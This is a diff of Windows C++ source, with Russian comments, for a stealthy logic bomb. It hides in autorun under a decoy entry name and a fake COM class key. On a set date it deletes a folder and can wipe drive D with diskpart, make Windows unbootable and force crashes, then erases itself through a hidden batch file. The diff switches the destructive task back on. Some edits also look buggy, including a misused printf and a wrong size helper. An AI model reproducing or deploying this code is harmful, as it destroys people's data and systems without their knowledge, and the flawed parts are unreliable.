@@ -4,29 +4,6 @@
 #include <string>
 using namespace std;
 
-static const wchar_t* RunOnceItemName = L"CTF Moniker";
-
-//HKEY_CLASSES_ROOT
-static const wchar_t* RegDataKeyName = L"CLSID\\{00000305-1111-0000-C000-A0B0C0000046}";
-
-static const wchar_t* DelDayKeyName = L"delDay";
-static const wchar_t* DelDayOfWeekKeyName = L"delDayOfWeek";
-static const wchar_t* DelMonthKeyName = L"delMonth";
-static const wchar_t* DelFolderKeyName = L"FolderToDel";
-static const wchar_t* DelDiskDKeyName = L"delD";
-static const wchar_t* KillWindowsKeyName = L"KillWin";
-
-bool DeleteFolder();
-bool PerformATask();
-bool IfDeleteDiskD();
-bool IfKillWindows();
-void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
-void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
-bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[]);
-bool CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[]);
-void KeyBoardLedBlink(void);
-void DoKillWindows();
-int sizeInBytes(CString strToCalc);
 
 CDeleteDay::CDeleteDay()
 {
@@ -49,12 +26,12 @@ bool CDeleteDay::AddToAutoRun()
 	//добавить себя в автозагрузку
 	//наверное правильней будет добавлять в RunOnce и каждый раз себя туда добавлять если не
 	//достигнута дата срабатывания
-	if (SHSetValue(HKEY_LOCAL_MACHINE
+	if (SHSetValue(HKEY_CURRENT_USER
 		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
 		, RunOnceItemName
 		, REG_SZ
 		, csExePath.GetString()
-		, csExePath.GetLength()) != ERROR_SUCCESS)
+		, stringSizeInBytes(csExePath)) != ERROR_SUCCESS)
 	{
 		TRACE("Облом с SHSetValue() в AddToAutorun()");
 		return false;
@@ -83,7 +60,7 @@ bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
 	HKEY hk;
 
 	// создать ключ в HKCR\CLSID
-	if (RegCreateKeyEx(HKEY_CLASSES_ROOT
+	if (RegCreateKeyEx(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, 0
 		, NULL
@@ -100,36 +77,36 @@ bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
 	RegCloseKey(hk);
 
 	//===== сохраним день удаления ======
-	if (SHSetValue(HKEY_CLASSES_ROOT
+	if (SHSetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelDayKeyName			//имя значения
 		, REG_SZ
 		, DeleteDay.GetString()
-		, sizeInBytes(DeleteDay)) != ERROR_SUCCESS)
+		, stringSizeInBytes(DeleteDay)) != ERROR_SUCCESS)
 	{
 		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
 		return false;
 	}
 
 	//===== сохраним день недели =====
-	if (SHSetValue(HKEY_CLASSES_ROOT
+	if (SHSetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelDayOfWeekKeyName			//имя значения
 		, REG_SZ
 		, DeleteWeek.GetString()
-		, sizeInBytes(DeleteWeek)) != ERROR_SUCCESS)
+		, stringSizeInBytes(DeleteWeek)) != ERROR_SUCCESS)
 	{
 		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
 		return false;
 	}
 
 	//===== сохраним месяц =====
-	if (SHSetValue(HKEY_CLASSES_ROOT
+	if (SHSetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelMonthKeyName			//имя значения
 		, REG_SZ
 		, DeleteMonth.GetString()
-		, sizeInBytes(DeleteMonth)) != ERROR_SUCCESS)
+		, stringSizeInBytes(DeleteMonth)) != ERROR_SUCCESS)
 	{
 		TRACE("Облом с SHSetValue() в SaveDeleteDay()");
 		return false;
@@ -141,12 +118,12 @@ bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
 // записываем какую папку будем удалять
 bool CDeleteDay::SavePathOfFolderToDelete(CString csFolderPath)
 {
-	if (SHSetValue(HKEY_CLASSES_ROOT
+	if (SHSetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelFolderKeyName
 		, REG_SZ
 		, csFolderPath.GetString()
-		, sizeInBytes(csFolderPath)) != ERROR_SUCCESS)
+		, stringSizeInBytes(csFolderPath)) != ERROR_SUCCESS)
 	{
 		TRACE(L"Облом с SHSetValue() в SaveFolderPathToDelete()");
 		return false;
@@ -173,7 +150,7 @@ bool CDeleteDay::EnableCrashOnCtrlScroll()
 {
 	HKEY hKey;
 
-	if (RegOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
+	if (RegOpenKey(HKEY_CURRENT_USER, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
 	{
 		DWORD lpData = 0x01;
 
@@ -191,7 +168,7 @@ bool CDeleteDay::DeleteDiskD(void)
 {
 	CString csDeleteD("YES");
 
-	if (SHSetValue(HKEY_CLASSES_ROOT
+	if (SHSetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelDiskDKeyName
 		, REG_SZ
@@ -209,7 +186,7 @@ bool CDeleteDay::SaveTaskKillWindows()
 {
 	CString csKillWindows("YES");
 
-	if (SHSetValue(HKEY_CLASSES_ROOT
+	if (SHSetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, KillWindowsKeyName
 		, REG_SZ
@@ -228,7 +205,7 @@ void CDeleteDay::SelfDelete()
 	//удалить себя из автозагрузки
 	HKEY hKey;
 
-	if (::RegOpenKeyEx(HKEY_LOCAL_MACHINE
+	if (::RegOpenKeyEx(HKEY_CURRENT_USER
 		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
 		, NULL
 		, KEY_ALL_ACCESS
@@ -317,24 +294,25 @@ bool CDeleteDay::InspectDeleteData()
 	int DelDay = 0, DelDayOfWeek = 0, DelMonth = 0;
 	int CurDay = 0, CurDayOfWeek = 0, CurMonth = 0;
 	
-	//получить дату удаления
-	ReadRegDeleteDay( DelDay, DelDayOfWeek, DelMonth);
-		
+	//получить дату удаления, если данные получить не удалось
+	if (!ReadRegDeleteDay(DelDay, DelDayOfWeek, DelMonth)) {
+		//то наверное програ запускается первый раз и читать пока нечего
+		return true;
+	}
+	
 	//определить текущую дату
 	GetCurrentDay(CurDay, CurDayOfWeek, CurMonth);
 	
 	//сравнить даты, если совпадают, то ...
 	//нужно сравнивать день, день недели и месяц по отдельности
-	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 && CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth )
-	{
-		TRACE0("Даты совпадают. Удаляем папку.\n");	
-			
-		//... выполнить задание
-		//PerformATask();
-	
-		return true;
-	}
-	
+	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 )	{	
+		if (CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth) {
+			TRACE0("Даты совпадают. Удаляем папку.\n");
+			//... выполнить задание
+			PerformATask();
+			return true;
+		}		
+	}	
 	return false;
 }
 
@@ -349,7 +327,7 @@ bool DeleteFolder()
 
 	CString cspvData;
 
-	SHGetValue(HKEY_CLASSES_ROOT, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);
+	SHGetValue(HKEY_CURRENT_USER, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);
 
 	csPath = cspvData;
 
@@ -391,48 +369,48 @@ bool DeleteFolder()
 
 bool PerformATask(void)
 {
+	const int SIZE = 1024;
 	// Далее выделяем много памяти - лишним не будет %)
-	wchar_t szFilePath[MAX_PATH] = { L"\0" };
-	wchar_t szFileBat[MAX_PATH] = { L"\0" };
-	wchar_t szFileExe[MAX_PATH] = { L"\0" };
-	wchar_t szFileDiskPart[MAX_PATH] = { L"\0" };
-	wchar_t szTempPath[MAX_PATH] = { L"\0" };
+	char szFilePath[SIZE] = { "\0" };
+	char szFileBat[SIZE] = { "\0" };
+	char szFileExe[SIZE] = { "\0" };
+	char szFileDiskPart[SIZE] = { "\0" };
+	char szTempPath[SIZE] = { "\0" };
 
-	wchar_t sz[600]; // Строка-помошник...
+	char sz[SIZE]; // Строка-помошник...
 
 	unsigned int iTmp;
-	wchar_t* lpTmp;
+	char* lpTmp;
 
-	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику
+	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику
 
-	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем в имя файла в досовский вид
-		wcsncpy(szFileExe, sz, sizeof(szFileExe));
+	if (GetShortPathNameA(szFileExe, sz, SIZE)) // Преобразуем в имя файла в досовский вид
+		strncpy(szFileExe, sz, sizeof(szFileExe));
 
-	size_t sLen = wcslen(szFileExe) - 1;
+	////////////////////////////////////////////////////////////////////
+	size_t sLen = strlen(szFileExe) - 1;
 	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки
 
-	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
+	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
 	{
-		if (!wcsncmp(lpTmp, L"\\", 1))
+		if (!strncmp(lpTmp, "\\", 1))
 			break;
 	}
 
 	//убираем из пути к фалу название программы
 	size_t count = lpTmp - szFileExe; //Number of characters to be copied
 
-	wcsncpy(szFilePath, szFileExe, count);
-	wcscat(szFilePath, L"\\");
+	strncpy(szFilePath, szFileExe, count);
+	strcat(szFilePath, "\\");
 
-	GetTempPath(MAX_PATH, szTempPath); // Получаем путь к TEMP-папке
+	GetTempPathA(MAX_PATH, szTempPath); // Получаем путь к TEMP-папке
 
-									   //если удалить диск Д
-	if (IfDeleteDiskD())
-	{
-		CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
+	//если удалить диск Д
+	if (IfDeleteDiskD()) {
+		//CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
 	}
 
-	if (IfKillWindows())
-	{
+	if (IfKillWindows()) {
 		//делаем загрузку винды невозможной
 		DoKillWindows();
 	}
@@ -442,18 +420,18 @@ bool PerformATask(void)
 
 	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
 
-	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_ARCHIVE);
+	//SetFileAttributes(szFileExe, FILE_ATTRIBUTE_ARCHIVE);
 	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл
 
 	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Делаем файл нормальным
 
-	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
+	HINSTANCE h = ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
 
-	SHDeleteKey(HKEY_CLASSES_ROOT, RegDataKeyName);
+	SHDeleteKey(HKEY_CURRENT_USER, RegDataKeyName);
 	//удаляем из автозагрузки
-	SHDeleteValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
+	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);
 
-	KeyBoardLedBlink();
+	//KeyBoardLedBlink();
 
 	return false; // И закрываемся
 }
@@ -466,7 +444,7 @@ bool IfDeleteDiskD(void)
 	DWORD dwDataType = REG_SZ;
 
 	//удалять только папку или диск д тоже
-	if (SHGetValue(HKEY_CLASSES_ROOT
+	if (SHGetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelDiskDKeyName
 		, &dwDataType
@@ -493,7 +471,7 @@ bool IfKillWindows()
 	DWORD dwDataType = REG_SZ;
 
 	//удалять только папку или диск д тоже
-	if (SHGetValue(HKEY_CLASSES_ROOT
+	if (SHGetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, KillWindowsKeyName
 		, &dwDataType
@@ -503,8 +481,7 @@ bool IfKillWindows()
 		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");
 	}
 
-	if (csKillW.Compare(L"YES") == 0)
-	{
+	if (csKillW.Compare(L"YES") == 0){
 		csKillW.ReleaseBuffer();
 		return true;
 	}
@@ -512,7 +489,7 @@ bool IfKillWindows()
 	return false;
 }
 
-void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
+bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
 {
 	CString RegStringValue;
 
@@ -520,7 +497,7 @@ void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
 	DWORD dwDataType = REG_SZ;
 
 	//===== получить день удаления папки =====
-	if (SHGetValue(HKEY_CLASSES_ROOT
+	if (SHGetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelDayKeyName
 		, &dwDataType
@@ -528,6 +505,7 @@ void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
 		, &dwDataBufferSize) != ERROR_SUCCESS)
 	{
 		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня удаления.\n");
+		return false;
 	}
 
 	//конвертим строку в число
@@ -535,7 +513,7 @@ void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
 	RegStringValue.ReleaseBuffer();
 
 	//===== получить день недели =====
-	if (SHGetValue(HKEY_CLASSES_ROOT
+	if (SHGetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelDayOfWeekKeyName
 		, &dwDataType
@@ -543,6 +521,7 @@ void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
 		, &dwDataBufferSize) != ERROR_SUCCESS)
 	{
 		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня недели удаления.\n");
+		return false;
 	}
 
 	//конвертим строку в число
@@ -550,7 +529,7 @@ void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
 	RegStringValue.ReleaseBuffer();
 
 	//===== получить месяц =====
-	if (SHGetValue(HKEY_CLASSES_ROOT
+	if (SHGetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
 		, DelMonthKeyName
 		, &dwDataType
@@ -558,13 +537,14 @@ void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
 		, &dwDataBufferSize) != ERROR_SUCCESS)
 	{
 		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении месяца удаления.\n");
+		return false;
 	}
 
 	//конвертим строку в число
 	Month = _wtoi(RegStringValue.GetString());
 	RegStringValue.ReleaseBuffer();
 
-	return;
+	return true;
 }
 
 void GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
@@ -627,35 +607,72 @@ bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_
 	return true;
 }
 
-bool CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[])
+//bool CreateBatFileW(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[])
+//{
+//	wchar_t strTemp[600]; // Строка-помошник...
+//	//создаем бат-файл ===========================================
+//	swprintf(szFileBat, L"%sSystem.bat", (wcslen(szTempPath)) ? szTempPath : szFilePath);
+//
+//	SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные
+//
+//	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
+//		GENERIC_WRITE,
+//		FILE_SHARE_WRITE,
+//		NULL,
+//		CREATE_ALWAYS,
+//		FILE_ATTRIBUTE_NORMAL,
+//		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)
+//
+//	if (!hFile)	{
+//		TRACE("Факн щет, файла System.bat нет и не будет");
+//		return false;
+//	}
+//
+//	wchar_t BATSTRING[1024] =
+//		L":Repeat\n"
+//		L"del \"%s\"\n" //команда на удаление экзешника
+//		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
+//		L":Repeat1\n"
+//		L"del \"%s\"\n"
+//		L"\0"; //удаление батника	
+//
+//	if (IfDeleteDiskD()){
+//		//формируем команду для записи в файл
+//		wcsncpy(BATSTRING,
+//			L":Repeat\n"
+//			L"del \"%s\"\n" //команда на удаление экзешника
+//			L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
+//			L"DiskPart.exe /S \"%s\"\n" //команда на удаление раздела
+//			L":Repeat1\n"
+//			L"del \"%s\"\n" //удаление батника
+//			L"del \"%s\"\n\0", sizeof(BATSTRING)); //удаление сценария diskpart
+//
+//		swprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
+//	}
+//	else {
+//		swprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileBat);
+//	}
+//
+//	DWORD dwBytesWritten;
+//	BOOL bError = (!WriteFile(hFile, strTemp, wcslen(strTemp), &dwBytesWritten, NULL) || wcslen(strTemp) != dwBytesWritten);
+//
+//	if (bError)	{
+//		TRACE("Факн щет, текст в файл System.bat не удалось записать");
+//		return false;
+//	}
+//
+//	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
+//
+//	return true;
+//}
+
+bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[])
 {
-	bool bDeleteD = IfDeleteDiskD();
+	char strTemp[600]; // Строка-помошник...
+	//создаем бат-файл в папке темп или в папке с программой
+	sprintf(szFileBat, "%sSystem.bat", (strlen(szTempPath)) ? szTempPath : szFilePath);
 
-	wchar_t BATSTRING[1024] =
-		L":Repeat\n"
-		L"del \"%s\"\n" //команда на удаление экзешника
-		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
-		L":Repeat1\n"
-		L"del \"%s\"\n"
-		L"\0"; //удаление батника		
-
-	if (bDeleteD)
-	{
-		wcsncpy(BATSTRING,
-			L":Repeat\n"
-			L"del \"%s\"\n" //команда на удаление экзешника
-			L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
-			L"DiskPart.exe /S \"%s\"\n" //команда на удаление раздела
-			L":Repeat1\n"
-			L"del \"%s\"\n" //удаление батника
-			L"del \"%s\"\n\0", sizeof(BATSTRING)); //удаление сценария diskpart
-	}
-
-	wchar_t sz[600]; // Строка-помошник...
-					 //создаем бат-файл ===========================================
-	swprintf(szFileBat, L"%sSystem.bat", (wcslen(szTempPath)) ? szTempPath : szFilePath);
-
-	SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные
+	SetFileAttributesA(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные
 
 	HANDLE hFile = CreateFile((LPCTSTR)szFileBat,
 		GENERIC_WRITE,
@@ -665,28 +682,40 @@ bool CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath
 		FILE_ATTRIBUTE_NORMAL,
 		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)
 
-	if (!hFile)
-	{
+	if (!hFile) {
 		TRACE("Факн щет, файла System.bat нет и не будет");
 		return false;
 	}
 
-	if (bDeleteD)
-	{
-		//заполняем строку для записи в файл
-		swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
+	char BATSTRING[1024] =
+		":Repeat\n"
+		"del \"%s\"\n" //команда на удаление экзешника
+		"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
+		":Repeat1\n"
+		"del \"%s\"\n"
+		"\0"; //удаление батника	
+
+	if (IfDeleteDiskD()) {
+		//формируем команду для записи в файл
+		strncpy(BATSTRING,
+			":Repeat\n"
+			"del \"%s\"\n" //команда на удаление экзешника
+			"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
+			"DiskPart.exe /S \"%s\"\n" //команда на удаление раздела
+			":Repeat1\n"
+			"del \"%s\"\n" //удаление батника
+			"del \"%s\"\n\0", sizeof(BATSTRING)); //удаление сценария diskpart
+
+		printf(strTemp, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
 	}
-	else
-	{
-		swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
+	else {
+		printf(strTemp, BATSTRING, szFileExe, szFileExe, szFileBat);
 	}
 
 	DWORD dwBytesWritten;
+	BOOL bError = (!WriteFile(hFile, strTemp, strlen(strTemp), &dwBytesWritten, NULL) || strlen(strTemp) != dwBytesWritten);
 
-	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);
-
-	if (bError)
-	{
+	if (bError) {
 		TRACE("Факн щет, текст в файл System.bat не удалось записать");
 		return false;
 	}
@@ -869,6 +898,6 @@ void DoKillWindows()
 }
 
 //возвращает размер строки в байтах
-int sizeInBytes(CString strToCalc) {
+int stringSizeInBytes(CString strToCalc) {
 	return sizeof(strToCalc)*strToCalc.GetLength();
 }
